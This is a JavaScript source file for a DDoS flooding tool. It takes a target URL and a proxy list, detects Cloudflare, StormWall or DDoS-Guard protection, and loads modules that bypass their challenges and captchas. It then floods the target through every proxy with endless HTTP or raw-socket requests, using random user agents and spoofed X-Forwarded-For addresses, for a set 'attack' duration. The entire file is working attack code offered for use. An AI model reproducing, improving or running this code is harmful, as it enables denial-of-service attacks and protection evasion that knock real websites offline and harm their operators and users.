const request = require('request');
const net = require('net');
const fs = require('fs');
const URL = require('url');
const colors = require('colors');
const args = require('minimist')(process.argv.slice(2));
const UserAgent = require('user-agents');
const events = require('events');
const bypasses = require('./bypasses/');

global.l7 = {};
global.storm = {};

process.on('uncaughtException', function (e) {  
 console.log(e)
   }).on('unhandledRejection', function (e) {  
    console.log(e)  
}).on('warning', e => { }).setMaxListeners(0);

events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;

process.on('SIGHUP', () => {
    return 1;
});

process.on('SIGCHILD', () => {
    return 1;
});

var proxies = [...new Set(fs.readFileSync(args["proxy"] ? args["proxy"] : 'proxies.txt', 'utf-8').replace(/\r/g, '').split('\n'))];

const IP_FOR_DETECT = 60;

var ATTACK, BYPASS = false;

const STATE = {
    running: false,
    firewall: false,
    firewalls: [],
    proxy: [],
    available: ['cloudflare', 'StormWall', 'browser_engine']
}

const countInfo = {
    hasrandom: false,
    captcha_after_js: 0,
    captcha_exit: 0,
    not_solved: 0,
    bypassed: 0,
    rps: 0
} 

const statusCodes = {
    success: 0,
    forbidden: 0,
    badgw: 0
};

function log(string) {
    let d = new Date(); 
    
    let hours = (d.getHours()<10?'0':'') + d.getHours();
    let minutes = (d.getMinutes()<10?'0':'') + d.getMinutes();
    let seconds = (d.getSeconds()<10?'0':'') + d.getSeconds();

    console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
}

function randomUA() {
    const userAgent = new UserAgent();
    return userAgent.toString();
}

function randomProxy() {
    return proxies[~~(Math.random() * proxies.length)]
}


/* storm.privacypass = require('./bypasses/privacypass.json'); */

function Init() {
    storm.target = args["url"];
    storm.time = args["time"];
    storm.host = args["host"];
    storm.mode = args["mode"] ? args["mode"] : 'socket';
    storm.method = args["method"] ? args["method"] : 'GET';
    storm.cock = args["bcookie"] ? args["bcookie"] : 1;
    storm.delay = args["delay"] ? args["delay"] : 0;
    storm.rate = args["rate"] ? args["rate"] : 0;
    storm.null = args["null"] ? args["null"] : false;
    storm.info = args["info"] ? args["info"] : false;
    storm.engine = args["engine"] ? args["engine"] : false;
    storm.forserw = args["skip"] ? args["skip"] : false;
    storm.click = args["click"] ? args["click"] : false;  
    storm.parsed = URL.parse(storm.target);
    storm.key = args["key"];
    storm.postdata = args["postdata"];
 

    shuffle(proxies);
    log(`Loaded ${proxies.length} proxies!\r\n`.cyan);

    log(`Your target: `.cyan + `${storm.target}`.magenta);
    log(`Forced Browser Engine: `.yellow + `${storm.engine == true ? "true".green : "false".red}`);
    log(`Ignore Protection: `.yellow + `${storm.forserw == true ? "true".green : "false".red}`);
    log(`Mode: `.yellow + (storm.mode == "http" ? `HTTP`.green : `Socket`.green));
    log(`Method: `.yellow + (storm.method == "GET" ? `GET`.green : `POST`.green));
    if(storm.postdata) {
        log(`PostData: `.yellow + `${storm.postdata}`.green);
    }
    if(storm.rate > 0) {
        log(`Rate: `.yellow + `${storm.rate}`.green);
    }
    if(storm.key) {
        log(`2Captcha Key: `.yellow + `${storm.key}`.green);
    }
	
	log(`HELLO JEFF WANNA PLAY SOME ROBOCRAFT?`.rainbow);

    AutoDetect();
}

function AutoDetect() {
    function Detect() {
        const proxy = randomProxy();
        const UA = randomUA();

        if(storm.engine == 'true' || storm.forserw == 'true') {
            STATE.firewall = storm.engine == 'true' ? ['browser_engine'] : "";
            STATE.firewalls.push(STATE.firewall);
        }
        else {
            request({
                method: "GET",
                url: storm.target,
                gzip: true,
                followAllRedirects: true,
                maxRedirects: 20,
                rejectUnauthorized : false,
                strictSSL : false,
                agentOptions: {
                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
                },
                timeout: 80e3,
                proxy: 'http://' + proxy,
                headers: {
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': UA,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9'
                }
            }, (err, res, body) => {
                if (res.headers['content-length']) {
                    if (res.headers['content-length'] >= 52428800) {
                        return process.exit(8);
                    }
                }

                if (res.headers.server == 'cloudflare') {
                    if (res.statusCode == 503 && (body.indexOf("Checking your browser before accessing</") !== -1 || body.indexOf("document.getElementById('challenge-form');") !== -1)) {
                        STATE.firewall = ['CloudFlare', 'UAM'];
                    } else if (res.statusCode == 403 && (res.headers['cf-chl-bypass'] || body.indexOf('<noscript id="cf-captcha-bookmark" class="cf-captcha-info">') !== -1)) {
                        if (res.headers['cf-chl-bypass']) {
                            STATE.firewall = ['CloudFlare', 'Captcha', true];
                        } 
                        else {
                            STATE.firewall = ['CloudFlare', 'Captcha', false];
                        }
                    } else if (res.statusCode == 403) {
                        request.get({
                            url: storm.target,
                            proxy: 'http://' + proxy,
                            headers: {
                                'Cache-Control': 'max-age=0',
                                'Upgrade-Insecure-Requests': 1,
                                'User-Agent': UA,
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US,en;q=0.9'
                            }
                        }, (err, res, body) => {
                            if (err && err.name == 'CaptchaError') {
                                STATE.firewall = ['CloudFlare', 'CaptchaV2', false];
                            }
                        });
                    } 
                } 
                else if (res.headers['x-firewall-protection'] && res.headers['x-firewall-protection'] == 'True' && res.statusCode == 200 && res.headers['x-firewall-port'] && res.headers.expires == '0') {
                    STATE.firewall = ['StormWall'];
                }
                else {

                }

                STATE.firewalls.push(STATE.firewall);
            });
        }
    }
    

    let NextDetect = setInterval(() => {
        STATE.running ? clearInterval(NextDetect) : setImmediate(Detect);

        if (STATE.firewalls.length >= IP_FOR_DETECT) {
            STATE.running = true;
            clearInterval(NextDetect);

            for (var i = 0; i < STATE.firewalls.length; i++) {
                if (Array.isArray(STATE.firewalls[i])) {
                    if (STATE.firewall == false) {
                        STATE.firewall = STATE.firewalls[i];
                    }
                }
            }
            storm.firewall = STATE.firewall;
            log(`Protection: `.yellow + `${storm.firewall ? storm.firewall[1] ? `${storm.firewall[0]}`.cyan + `*`.red + `${storm.firewall[1]}`.cyan : `${storm.firewall[0]}`: `None`.cyan}`);

            PrepareAttack();

            setTimeout(() => {
                log(`[Alert]`.red + ` Attack finished!`.cyan);
                process.exit(4);
            }, storm.time * 1e3);
        }
    });
}


function prepareMode() {
    switch (storm.mode) {
        case 'socket': {
            ATTACK = socketMode;
            break;
        }
        case 'http': {
            ATTACK = httpMode;
        }
    }
}

function PrepareAttack() {
            prepareMode();

            if (storm.firewall) {
                if (STATE.available.includes(storm.firewall[0].toLowerCase())) {
                    BYPASS = load(storm.firewall[0].toLowerCase());
                } else {
                    BYPASS = load('browser_engine');
                }

                let count = 0;
                let g_bExecBlocked = 0;
                proxies.forEach(async p => {
                    let settings = {
                        userAgent: randomUA(), // Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
                        proxy: p,
                        randomSpoof: randomSpoof()
                    }

                    if(storm.firewall[0] == "browser_engine" || storm.firewall[0] == "CloudFlare") {
                        const Sleep = 1000;
                        while(g_bExecBlocked >= 80) {
                            await mysleep(Sleep);
                        }
                    }

                    g_bExecBlocked++;       
                    log(`[${count++}] Trying to bypass with proxy: ${settings.proxy}`.cyan);

                    BYPASS(settings.proxy, settings.userAgent, async cookie => {
                        g_bExecBlocked--;
                        if(!cookie) {
                            countInfo.not_solved++;
                        } 
                        else {
                            if(cookie.includes('captcha_after_js')) {
                                countInfo.captcha_after_js++;
                            }
                            else if(cookie.includes('captcha_exit')) {
                                countInfo.captcha_exit++;
                            }
                            else {
                                settings.cookie = cookie;
                                countInfo.bypassed++;
                                log(`Cookie: ${settings.cookie}`);
                                await ATTACK(settings);
                            }
                        }
                    });
                });
            } 
            else {
                proxies.forEach(async p => {
                    let settings = {
                        proxy: p,
                        userAgent: randomUA()
                    };
                    await ATTACK(settings);
                });
            }
        function load(bypassModule) {
            return bypasses[bypassModule]();
        }
}

function httpMode(a) {
    //console.log(a)

    //setInterval(async function() {
        var headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Connection': 'Keep-Alive',
            'Referer': storm.target,
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': a.userAgent,
            'X-Forwarded-For': a.randomSpoof
        };
        if (a.cookie) {
            headers['Cookie'] = a.cookie;
        }
        if(storm.host) {
            headers['Host'] = storm.host;
        }
        else {
            headers['Host'] = storm.parsed.host;
        }
        if(args["dev"]) {
            headers['Accept'] = 'application/vnd.softswiss.v1+json';
        }
        var options = {
            url: storm.target,
            method: storm.method,
            headers,
            proxy: 'http://' + a.proxy
        };

        if(storm.method == "POST" && storm.postdata) {
            if(args["json"]) {
                headers['Content-Type'] = 'application/json';
            }
            else {
                headers['Content-Type'] = 'application/x-www-form-urlencoded';
            }
            options['body'] = storm.postdata; // { "name": "Luke Skywalker" }
        }
        
        if(!storm.info) {
            request(options, async (err, res, body) => {
                httpMode(a);
            });
        }
        else {
            request(options, (err, res, body) => {
                httpMode(a);
                console.log(res.statusCode);
                if(res) {
                    countInfo.rps++;
                    switch(res.statusCode) {
                        case 200: { statusCodes.success++; break; }
                        case 403: { statusCodes.forbidden++; break; }
                        case 502: { statusCodes.badgw++; }
                    }
                    if(res.statusCode == 403) {
                        if(body.includes("<title>DDOS-GUARD</title>")) {
                            log("Proxy get JS or Captcha. Closing..")
                            //clearInterval(interval);
                        }
                    }
                }
            });
        }
    //}, storm.rate);
}

function socketMode(a) {
    let proxy = a.proxy.split(':');
    let req = () => {
        if(!storm.null) {
            (netSock.writable && !netSock.destroyed) ? netSock.write(`${storm.method} ${storm.target} HTTP/1.1\r\nHost: ${storm.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nCache-Control: no-cache, no-store, must-revalidate\r\nUpgrade-Insecure-Requests: 1${a.cookie ? ('\r\nCookie: ' + a.cookie) : ''}\r\nUser-Agent: ${a.userAgent}\r\nX-Forwarded-For: ${a.randomSpoof}\r\n\r\n`): netSock.end();
        }
        else {
            (netSock.writable && !netSock.destroyed) ? netSock.write(`${storm.method} ${storm.target} HTTP/1.1\r\nHost: ${storm.parsed.host}\r\nConnection: Keep-Alive\r\n\r\n`): netSock.end();
        }
    }
    var resetted = false, netSock = {};

    process.nextTick(async () => {
        if(proxy[1] <= 0 || proxy[1] > 65536) {
            return;
        }
        netSock = net.connect({
            host: proxy[0],
            port: proxy[1]
        }, async () => {
            for (let j = 0; j < 50; j++) {
                await req();
            }
            netSock.on('data', async () => {
                resetted ? false : socketMode(a), resetted = true;
                netSock ? (await req()) : false;
            });
        }).once('disconnect', () => {
            resetted ? netSocket.end() : socketMode(a), resetted = true;
            return;
        });
    });
}

function mysleep(ms) { return new Promise((resolve) =>  { setTimeout(resolve, ms); }); }
function shuffle(array) { array.sort(() => Math.random() - 0.5); }
function randomSpoof() { return `${randomIp()}, ${randomIp()}`; }
randomByte = function () { return Math.round(Math.random() * 256); }
randomIp = function () {
    var ip = randomByte() + '.' +
        randomByte() + '.' +
        randomByte() + '.' +
        randomByte();
    return ip;
}

/* if(storm.info) {
    setInterval(function() 
    {
        if(countInfo.bypassed > 0 || countInfo.captcha_after_js > 0 || countInfo.captcha_exit > 0 || countInfo.not_solved > 0) {
            log(`Bypassed: ${countInfo.bypassed} proxies!`.cyan + ` | Captcha after JS: ${countInfo.captcha_after_js} | Captcha: ${countInfo.captcha_exit} | Error: ${countInfo.not_solved}`.yellow);
        }
    }, 5000);

    setInterval(function() 
    {
        if(countInfo.rps > 0 || statusCodes.success > 0 || statusCodes.forbidden > 0 || statusCodes.badgw > 0) {
            log(`RPS: ${countInfo.rps}`.blue + ` [`.magenta + `Success: ${statusCodes.success}`.green + ` |`.blue + ` Forbidden: ${statusCodes.forbidden} `.red + `|`.blue + ` Bad gateway: ${statusCodes.badgw}`.yellow + `]`.magenta);
            countInfo.rps = 0;
        }
    }, 1000);
} */

setImmediate(Init);